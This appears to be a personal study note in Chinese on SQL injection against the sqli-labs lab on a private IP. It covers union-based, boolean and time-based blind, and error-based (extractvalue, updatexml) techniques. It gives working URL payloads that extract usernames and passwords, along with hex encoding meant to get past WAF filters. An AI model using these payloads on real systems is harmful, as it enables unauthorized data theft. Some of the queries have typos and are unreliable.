# sql注入 

逻辑当中存在 恒真的 判断条件则会返回所有的信息  

or 1=1 

or 1  

or "1"

````
select * from xxx where username="Bob" or 1;
````







**注释当中执行代码**

```
select /*!user*/ from dvwa.users;
```



在sql语句当中的语法其实是存在 运算的

```
select * from dvwa.users where first_name="Bob"or 1+'1'=2 union select 1,2,3,4,'5g',6,7,8 order by 5\G;
```

和 

```
select * from dvwa.users where first_name="Bob"or 1+'1'=3 union select 1,2,3,4,'5g',6,7,8 order by 5\G;
```

的返回结果就是不一样的。







sql注入的分类 

```
 •基于布尔SQL盲注

​ •基于时间的SQL盲注

​ •基于报错的SQL盲注

基于如何处理输入的SQL查询（数据类型）

•基于字符串

•数字或整数为基础的

基于程度和顺序的注入(哪里发生了影响)

★一阶注射

★二阶注射

一阶注射是指输入的注射语句对WEB直接产生了影响，出现了结果；二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，通过其它的辅助间接的对WEB产生危害，这样的就被称为是二阶注入.
基于注入点的位置上的

▲通过用户输入的表单域的注射。

▲通过cookie注射。

▲通过服务器变量注射。 （基于头部信息的注射）
```



and 和 or 的优先级的不同 

and的优先级 > or 



desc 的用法 

展现mysql表当中字段结构 







几种常见的数据连接函数  

1. concat(str1,str2,...)——没有分隔符地连接字符串
2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串
3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据





![image-20210715165526780](D:\Users\80303920\Pictures\typora图床\image-20210715165526780.png)

查询数据库

```
select schema_name from information_schema.schemata ;
```

show databaes;



查询数据表

```
select table_name from information_schema.tables where table_schema="" ;
```

show tables;



查询表当中的列 

```
select column_name from information_schea.columns where table_name="";
```



**进行注入的时候使用 "" 比较少见 一般是将其转换为 0x 的十六进制形式** 

在mysql当中都可以通用十六进制来进行

```
select concat_ws(0x23,version(),2);
```

使用十六进制可以绕过waf的字符串过滤



**另外进行union注入**的时候最好选择将注入语句放在最后 

```
index.php?id=1' union select 1,2,table_name from information_schema.tables where table_schema= 0x7365637572697479 %23

index.php?id=1' union select 1,2,table_name from information_schema.tables where table_schema= 0x7365637572697479 %23
```



使用concat 将查询到的数据进行集合

三个函数 的分析 

concat 

concat_ws 使用分隔符 进行隔离  

group_concat 将一组数据使用分隔符进行隔离   

```
select group_concat(0x23,1,table_name) from information_schema.tables where table_schema="security";
```





示例 

```
192.168.233.140:83/Less-1/index.php?id=-1' union select 1,1,group_concat(table_name) from information_schema.tables where table_schema= 0x7365637572697479 %23
```



`# 可以和--+ 进行相互替换 但是注意有时候需要 #进行urlencode 为 %23

 问题  

limit在注入当中的应用

注意闭合其中给的双引号之类的 



在包含字符当中加上 () 几乎是相同的 

```
select username from users;
select (username) from users;
```



### 基于布尔类型 

注意盲注的类型都是有条件进行筛选，而不是直接逻辑判断  

![image-20210723150713443](D:\Users\80303920\Pictures\typora图床\image-20210723150713443.png)



```
select case when {判断语句} then sleep(3) else 1 end;
select case when (ascii(substr((select version()),1,1))=58) then sleep(3) else end;
```

​			

```
select case When ascii(substr(concat(user,password),1,1))>53 THEN 1 else 0 end from users limit 0,1;
```



使用case when只能在基于时间的盲注当中存在一些，其他没什么用 

```
select user from users where user="admin" and 1= (select case when ascii(substr((select User from mysql.user limit 0,1),1,1)) =97 then 1 else 0 end);
```





通常是在sql语句当中加入逻辑根据返回的结果来判断

 一般的判断语句为 

````
and  
and 1= (select 1 f)
or 
if 
````

case语句 



字符串的截取函数 

```
substr 
mid 
cast 
```







### 报错进行打印内容 

**extractvalue** 

extracvalue从目标的XML文件当中查询的字符串 

```
extractvalue(1,concat(0x7e,(select @@version),0x7e))

http://192.168.233.140:83/Less-5/?id=1%27%20and%20extractvalue(1,concat(0x7e,(select%20concat(username,password)%20from%20security.users%20limit%201,1),0x7e))--+
```

 



**updatexml** 

```
updatexml(1,concat(0x7e,(select @@version),0x7e),1)

http://192.168.233.140:83/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20concat(username,password)%20from%20security.users%20limit%201,1),0x7e),1)--+
```

updatexml的本意是更新xpath文档当中的字符串，我们的xpath_string写错的时候就会出现错误 

**name_const**  

感觉平时使用的比较少 

```
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x

http://192.168.233.140:83/Less-5/?id=1%27%20and%20select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x--+
```

**floor()+count()+group by**



问题 

比较好的文章

https://www.freebuf.com/articles/web/175049.html

### orderby 注入

1、通过返回的数据的排列

2、通过if else来进行布尔判断注入的成功与否 
